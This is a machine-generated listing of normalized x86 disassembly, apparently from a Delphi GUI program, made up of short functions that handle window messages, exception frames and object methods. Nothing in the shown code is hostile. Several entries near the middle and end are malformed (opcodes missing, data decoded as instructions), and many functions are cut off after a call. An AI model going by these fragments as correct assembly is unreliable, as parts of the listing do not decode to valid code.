retn
sub_4451cc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_446ef4
pop esi
retn
sub_4452e0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_445330
pop esi
retn
sub_4452f4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44541c
pop esi
retn
sub_445308
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44531c
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44540f
jmp sub_4039a0
sub_445416
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4454a6
jmp sub_4039a0
sub_4454ad
pop ebx
pop ecx
pop ebp
retn
sub_4454b4
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_4454c4
retn
sub_4454c8
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_4454e8
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_445648
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_445718
retn
sub_445830
jmp sub_4039a0
sub_445837
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445902
jmp sub_4039a0
sub_44592c
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_4459be
jmp sub_4039a0
sub_445b90
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_445e34
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_445f10
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_44393c
pop esi
retn
sub_445fd4
push esi
mov si 0xffc1
call sub_403448
pop esi
retn
sub_446000
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_446014
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_446028
call sub_4438fc
retn
sub_446030
call sub_4438fc
retn
sub_446038
call sub_4438fc
retn
sub_4460e0
push ebx
mov ebx eax
mov eax ebx
call sub_441f94
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_423720
mov dx 0xb009
mov eax ebx
call sub_44393c
pop ebx
retn
sub_446244
call sub_4438fc
retn
sub_44624c
call sub_4438fc
retn
sub_446254
call sub_4438fc
retn
sub_44625c
call sub_4438fc
retn
sub_4462c0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_446756
jmp sub_4039a0
sub_44675d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44683c
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_4469e0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
mov eax [ eax + 0x190 ]
retn
mov eax edx
call sub_446be4
retn
sub_4469f8
jmp r-xdata
mov edx [ eax + 0x30 ]
test edx edx
jne r-xdata
mov eax edx
mov edx [ eax + 0x190 ]
test edx edx
jne r-xdata
mov eax edx
retn
call sub_446be4
mov edx eax
sub_446a18
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_441578
retn
sub_446ab8
push ebx
mov ebx eax
mov eax ebx
call sub_446ee8
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_446ad4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_446cac
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_446be4
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_446d04
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_441578
sub_446d24
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_441578
sub_446d48
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_446d54
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_441578
sub_446e00
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_446da4
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_446edc
jmp sub_4039a0
sub_446ee3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447102
jmp sub_4039a0
sub_447109
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_447210
call sub_441348
retn
sub_44765e
jmp sub_4039a0
sub_4476f4
mov eax [ r-xdata ]
retn
sub_44785b
jmp sub_4039a0
sub_44796c
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_441578
sub_44798c
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_441578
sub_447ca2
jmp sub_4039a0
sub_447de4
test [ eax + 0x52 ] 0x4
setne al
retn
sub_447f40
jmp sub_4039a0
sub_447f47
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_423d60
retn
sub_447f63
jmp sub_4039a0
sub_447f70
retn
sub_448044
mov [ edx + 0xc ] 0xffffffff
retn
sub_4480a2
jmp sub_4039a0
sub_4480a9
pop ecx
pop ecx
pop ebp
retn
sub_448149
jmp sub_4039a0
sub_448150
pop ebx
mov esp ebp
pop ebp
retn
sub_4481bc
call sub_444104
retn
sub_44824f
jmp sub_4039a0
sub_448256
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_448435
jmp sub_4039a0
sub_44843c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448658
jmp sub_4039a0
sub_4486ac
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_448598
sub_4487f0
push ebx
mov ebx eax
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_448808
push ebx
mov ebx eax
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_4488f4
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_444d3c
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_44898f
jmp sub_4039a0
sub_448996
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4489b9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_423d60
retn
sub_4489b2
jmp sub_4039a0
sub_4489b9
pop ebx
pop ecx
pop ebp
retn
sub_4489c0
retn
sub_448a28
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_448d95
jmp sub_4039a0
sub_448f7c
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_449168
jmp sub_4039a0
sub_449218
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_44922c
inc [ eax + 0x6c ]
retn
sub_449230
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_44aab0
sub_449390
call sub_449a90
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_449d3b
jmp sub_4039a0
sub_449d42
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449d5f
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
sub_449d58
jmp sub_4039a0
sub_449d5f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a040
jmp sub_4039a0
sub_44a047
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a064
mov eax [ ebp - 0x4 ]
call sub_423d60
retn
sub_44a05d
jmp sub_4039a0
sub_44a064
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a081
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
sub_44a07a
jmp sub_4039a0
sub_44a081
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a535
jmp sub_4039a0
sub_44a53c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a6c7
jmp sub_4039a0
sub_44a6ce
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a783
jmp sub_4039a0
sub_44a78a
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a878
jmp sub_4039a0
sub_44a8c9
jmp sub_4039a0
sub_44a8d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a98c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44929c
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_44aad8
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_448dd8
sub_44b3d8
jmp sub_4039a0
sub_44b3df
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b4a8
call GetCapture
retn
sub_44b4b0
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cf60
pop ebx
retn
sub_44b4c0
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44b726
jmp sub_4039a0
sub_44b920
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_44bb34
jmp sub_4039a0
sub_44bb3b
pop ebx
mov esp ebp
pop ebp
retn
sub_44bb86
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_44bc03
jmp sub_4039a0
sub_44bc0a
pop ebp
retn
sub_44bc92
jmp sub_4039a0
sub_44bc99
pop ebp
retn
sub_44c1f0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sahf
retn 0x44
sub_44c1fc
lodsb [ esi ]
retn 0x44
sub_44c2a2
out dx eax
[ eax + edx * 8 + 0x44 ]
sub_44c364
sbb al 0xca
inc esp
add [ eax ] dh
0x44
sub_44c36c
inc esp
0x44
sub_44c370
pop eax
0x44
sub_44c374
insb
0x44
sub_44c3e8
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_41a294
retn
sub_44c400
mov al 0x1
retn
sub_44c404
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_420008
retn
mov eax edx
retn
sub_44c414
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41ffd8
retn
mov al 0x1
retn
sub_44c704
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a238
pop esi
pop ebx
retn
sub_44c718
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44c754
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44c9b8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
pop ebx
retn
sub_44c9cc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
pop ebx
retn
sub_44c9e0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
pop ebx
retn
sub_44c9f4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
pop ebx
retn
sub_44ca08
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
pop ebx
retn
sub_44ca1c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
pop ebx
retn
sub_44ca30
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
pop ebx
retn
sub_44ca44
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
pop ebx
retn
sub_44ca58
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
pop ebx
retn
sub_44ca6c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
pop ebx
retn
sub_44ca80
retn
sub_44ca84
retn
sub_44ca88
retn
sub_44ca8c
retn
sub_44ca90
retn
sub_44ca94
retn
sub_44ca98
retn
sub_44ca9c
retn
sub_44caa0
retn
sub_44caa4
retn
sub_44caa8
retn
sub_44caac
retn
sub_44cd58
jmp sub_4039a0
sub_44d0f4
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x90 ] eax
sub_44d11c
push esi
mov si 0xffef
call sub_403448
pop esi
retn
sub_44d1bd
jmp sub_4039a0
sub_44d1c4
pop ebp
retn
sub_44d1c8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419ac0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419ac0
sub_44d368
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44d4ed
jmp sub_4039a0
sub_44d4f4
pop ebx
pop ecx
pop ebp
retn
sub_44d4f8
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44d500
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44d6d0
sub_44d5ad
jmp sub_4039a0
sub_44d5b4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_40324c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44d763
jmp sub_4039a0
sub_44d76a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d802
jmp sub_4039a0
sub_44d809
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d826
mov eax [ ebp - 0xc ]
call sub_40324c
retn
sub_44d81f
jmp sub_4039a0
sub_44d826
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403448
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d8df
jmp sub_4039a0
sub_44d8e6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d8ec
or edx 0xffffffff
call sub_44d860
retn
sub_44dcfb
jmp sub_4039a0
sub_44dd02
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd1f
mov eax [ ebp - 0xc ]
call sub_40324c
retn
sub_44dd18
jmp sub_4039a0
sub_44dd1f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd3c
mov eax [ ebp - 0x4 ]
call sub_44e834
retn
sub_44dd35
jmp sub_4039a0
sub_44dd3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44df40
jmp sub_4039a0
sub_44df47
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44df4c
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403448
sub_44df64
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_418ddc
pop ebx
retn
sub_44e008
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_41a0dc
sub_44e11f
jmp sub_4039a0
sub_44e126
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
sub_44e13c
jmp sub_4039a0
sub_44e44e
jmp sub_4039a0
sub_44e455
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e472
mov eax [ ebp - 0x10 ]
call sub_40324c
retn
sub_44e46b
jmp sub_4039a0
sub_44e472
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e48f
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
sub_44e488
jmp sub_4039a0
sub_44e48f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e4f8
jmp sub_4039a0
sub_44e611
jmp sub_4039a0
sub_44e62e
jmp sub_4039a0
sub_44e7e6
jmp sub_4039a0
sub_44e7ed
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e830
inc [ eax + 0x5c ]
retn
sub_44e834
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403448
sub_44e888
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44e8c5
jmp sub_4039a0
sub_44e8cc
pop ebp
retn
sub_44e8d0
sub [ rw-data ] 0x1
retn
sub_44ec3c
pushfd
0x44
sub_44f838
mov eax [ esp + 0x8 ]
retn
sub_44f840
push ebx
mov ebx eax
call sub_44f838
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
jmp sub_4039d8
sub_44f85c
pop ebx
retn
sub_44fad5
jmp sub_4039a0
sub_44fadc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fc27
jmp sub_4039a0
sub_44fc2e
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44fc44
push ebx
mov eax [ rw-data ]
call sub_41a738
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_41a70c
mov eax ebx
pop ebx
retn
sub_44fdcc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44fde8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_4504e3
jmp sub_4039a0
sub_4504ea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4505e2
jmp sub_4039a0
sub_4505e9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450a0c
jmp sub_4039a0
sub_450a13
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_450ebf
jmp sub_4039a0
sub_451360
jmp sub_4039a0
sub_451367
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4517cb
jmp sub_4039a0
sub_451c88
jmp sub_4039a0
sub_451c8f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45203a
jmp sub_4039a0
sub_452041
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45204f
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4521fc
mov eax [ r-xdata ]
retn
sub_452238
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45224c
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45225c
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45226c
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_452568
mov edx eax
sub_452304
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
mov edx esi
call sub_452284
pop esi
pop ebx
retn
sub_452380
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_452568
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_41a294
mov ecx eax
sub_452758
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_4527c0
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_452b68
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_452b9c
sub_452b9c
mov edx sub_452b74
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44fcc4
retn
sub_452d86
jmp sub_4039a0
sub_452d8d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453224
jmp sub_4039a0
sub_453263
jmp sub_4039a0
sub_45326a
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453408
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_453544
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403448
pop esi
pop ebp
retn 0x8
sub_453560
mov eax [ eax + 0x34 ]
call sub_450798
retn
sub_45356c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403448
pop esi
retn
sub_4535a8
push ebx
mov ecx sub_453580
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44fcc4
pop ebx
retn
sub_4537dc
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_4537f0
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_453925
jmp sub_4036ec
sub_453a27
jmp sub_4039a0
sub_453a52
jmp sub_4039a0
sub_453a59
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_453a70
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_453c58
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4535a8
sub_453cd8
jmp sub_4039a0
sub_453d1c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_453d34
push ebx
mov ebx eax
mov eax ebx
call sub_420028
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_453d86
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_4535a8
sub_453dfc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_453f45
jmp sub_4039a0
sub_453f4c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45418c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_45419c
sub_4541f0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_454200
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_454210
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_454220
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_454230
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_4542a8
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4505f0
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_4505f0
retn
sub_4542c4
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4505f0
sub_45430c
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_453560
retn
mov eax edx
retn
sub_4543b8
mov [ eax + 0x58 ] edx
call sub_4542e0
retn
sub_4543ee
jmp sub_4036ec
sub_4543f3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460064
call sub_403a54
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454759
jmp sub_4039a0
sub_454760
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_40324c
retn
sub_454776
jmp sub_4039a0
sub_454877
jmp sub_4039a0
sub_45487e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45489b
mov eax [ ebp - 0x14 ]
call sub_40324c
retn
sub_454894
jmp sub_4039a0
sub_4548b9
jmp sub_4039a0
sub_454943
jmp sub_4039a0
sub_45494a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45497c
push ebx
mov ebx eax
mov eax ebx
call sub_41a37c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_420dd8
sub_454a40
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_454a54
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_454a5c
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_454e21
jmp sub_4039a0
sub_454e28
mov eax ebx
pop esi
pop ebx
